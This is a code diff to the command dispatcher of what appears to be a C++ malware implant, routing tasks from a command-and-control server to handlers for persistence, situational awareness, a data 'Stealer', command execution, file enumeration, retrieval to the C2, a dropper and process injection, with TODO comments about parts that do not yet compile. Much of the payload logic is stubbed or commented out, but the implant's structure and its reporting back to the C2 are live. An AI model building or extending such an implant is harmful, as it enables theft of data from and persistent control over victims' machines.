@@ -1,13 +1,20 @@
 #include "execute.h"
 
 /* Directory of Commands
-- Persistance
+- Persistence 1
 - Situational Awareness
 - Stealer
 - Execution <arg>
 - File Enumeration <arg> - List files in the directory
 
+In the works
+- Dropper [Current version runs]
+I cannot for the life of me get the Dropper header to run in the execute header file
 
+TODO:
+- Persistence 2 - Doesn't compile
+- Retrieval - Is commented out?
+- Injection - Will work on it next time
  */
 
 void execute(std::string command, std::string args, int task_id, int implant_id){
@@ -16,11 +23,19 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
 
     /* Persistance */
     // before publishing - the bat file needs to load the implant.exe
-    if(command.compare("Persistance") == 0){
-        printf("Executing Persistance\n");
+    // only uncomment in sandbox
+    if(command.compare("Persistence 1") == 0){
+        printf("Executing Persistence\n");
         results = "executed";
         // persist_execution();
         HttpResponse("/response", implant_id, task_id, results, "success", command);
+    }
+
+    // currently doesn't compile
+    if(command.compare("Persistence 2") == 0){
+        printf("Executing Persistence 2\n");
+        //Add in Persistence_2
+        // Windows Scheduler
     }
 
     /* Situational Awareness */
@@ -31,7 +46,7 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
     }
 
     /* Execution */
-    if(command.compare("Execution")){
+    if(command.compare("Execution") == 0){
         printf("Executing Execution\n");
         /* I have not double-checked this code
         I grabbed this from our previous patch of code and I'm just
@@ -54,7 +69,7 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
     }
     
     /* File Enumeration */
-    if(command.compare("FileEnum")){
+    if(command.compare("File Enumeration") == 0){
         printf("Executing File Enumeration\n");
             //std::string s = std::string("C:\\Windows\\System32");
         std::string path = args;
@@ -75,6 +90,13 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
             //std::cout << item;
     }
 
+    /* Retrieval */
+    // doesn't work?
+    if(command.compare("Retrieval") ==0 ){
+        printf("Executing Retrieval\n");
+        //Where we add in SendToC2
+    }
+
     /* Stealer Function */
     if(command.compare("Stealer") == 0){
         json data_from_driver;
@@ -86,6 +108,18 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
         HttpResponse("/response", implant_id, task_id, results, "success", command);
     }
 
+    /* Dropper */
+    if(command.compare("Dropper") == 0){
+        printf("Executing Dropper\n");
+        //Dropper();
+    }
+
+    /* Injection */
+    //hasn't been implemented
+    if(command.compare("Injection") == 0){
+        printf("Executing Injection\n");
+
+    }
     return;
 }
 
